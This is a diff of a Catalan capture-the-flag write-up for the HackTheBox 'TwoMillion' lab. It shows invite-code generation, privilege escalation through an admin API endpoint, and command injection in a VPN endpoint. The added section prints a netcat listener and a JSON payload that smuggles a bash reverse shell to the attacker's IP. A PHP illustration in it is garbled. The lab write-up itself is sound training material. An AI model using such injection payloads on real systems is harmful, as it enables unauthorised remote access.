@@ -93,11 +93,53 @@ Els directoris que ens interessen són: _login_, _register_, _invite_ i _api_. D
         });
 ````
 També es veu que executa un fitxer de JavaScript a la ruta _/js/inviteapi.min.js_, en el qual, a banda de l'endpoint _verify_, trobem un altre per generar un codi: _generate_. Per tant, es dedueix que per generar un codi hem de fer una petició a l'endpoint _/api/v1/invite/generate_. Tanmateix, una petició per GET retorna un codi d'error 405 dient que el mètode no està permès però provant la mateixa petició amb el mètode POST retorna un codi d'invitació en format base64.
+
 ![image](https://github.com/user-attachments/assets/66679475-d9e7-4814-bb84-b55a26a5eb52)
+
 ````bash
 > echo "VVpXQ0ctWlBGVjQtTTI5Q1YtWUVRRjQ=" | base64 -d
 UZWCG-ZPFV4-M29CV-YEQF4
 ````
 I ja ens podem registrar :)
 
-## Foothold
+## Initial Foothold
+Amb la sessió ja iniciada, una petició a la ruta _/api/v1_ retorna una descripció de totes les opcions de l'API i els mètodes que permet cadascuna.
+
+![image](https://github.com/user-attachments/assets/8f03fde9-6a35-4fc3-bc35-0067bf07b33f)
+
+Una d'aquestes és _/api/v1/admin/settings/update_, que mitjançant el mètode PUT permet actualitzar les dades d'un usuari, inclús si és administrador o no. Jugant amb les respostes que dóna cada petició, s'arriba a una petició final que permet convertir-nos en administrador.
+
+![image](https://github.com/user-attachments/assets/dd5222fc-b315-4f4c-b39e-7ea8131c42e3)
+
+I ara, si llancem una petició GET a _/api/v1/admin/auth_, veurem que som administradors.
+
+![image](https://github.com/user-attachments/assets/519fa0c0-fed6-4a81-a761-639a71d25e8a)
+
+Una altra opció de l'API és generar una VPN per a qualsevol usuari, a través de peticions POST. Com és un host Linux, es pot suposar que per darrere hi ha una execució de comandes a nivell de sistema per generar la VPN, així que es pot dur a terme una injecció de comandes si l'input no està sanititzat, de la següent forma:
+````php
+<?php sytem($_GET['VPN command ;command injection']); ?>
+````
+Així doncs, provem de ficar-nos en escolta per la interfície _tun0_ per rebre possibles traces ICMP i de fer un ping a la nostra màquina atacant per veure si aconseguim establir una connexió.
+![image](https://github.com/user-attachments/assets/a4efc331-93da-4b3e-8527-b5ec2e403c00)
+````bash
+> sudo tcpdump -i tun0 icmp
+
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+13:30:56.547888 IP 2million.htb > 10.10.16.68: ICMP echo request, id 3, seq 1, length 64
+13:30:56.547905 IP 10.10.16.68 > 2million.htb: ICMP echo reply, id 3, seq 1, length 64
+````
+I com veiem que hem rebut la traça de tornada, podem establir una reverse shell.
+
+**- Atacant:** nc -lvnp 4321
+
+**- POST data:** { "username":"admin;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.68/4321 0>&1'" }
+
+![image](https://github.com/user-attachments/assets/5f5a966c-d81e-4de9-bc2e-cfd0c2e9a998)
+
+Hem aconseguit una reverse shell com l'usuari _www-data_.
+
+## User
+
+
+ 
